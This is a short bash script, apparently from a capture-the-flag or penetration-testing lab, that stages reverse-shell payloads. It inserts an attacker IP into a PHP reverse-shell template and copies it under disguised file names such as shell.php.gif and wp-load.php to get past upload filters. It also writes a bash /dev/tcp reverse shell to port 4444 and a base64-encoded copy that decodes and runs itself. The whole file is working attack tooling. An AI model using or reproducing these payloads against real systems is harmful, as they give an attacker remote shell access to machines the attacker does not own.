#!/bin/bash

cp -r www-skel/ www/
sed -i "s/10.10.14.2/$1/g" www/*
cp www/revshell.php www/shell.php.gif
cp www/revshell.php www/wp-load.php
cp www/revshell.php www/shell.php
echo "bash -c '/bin/bash -i >& /dev/tcp/$1/4444 0>&1'" >> www/shell.sh
SHELL=$(cat www/shell.sh | base64 -w 0)
echo "echo -n $SHELL | base64 -d | bash" >> www/shell.b64.sh
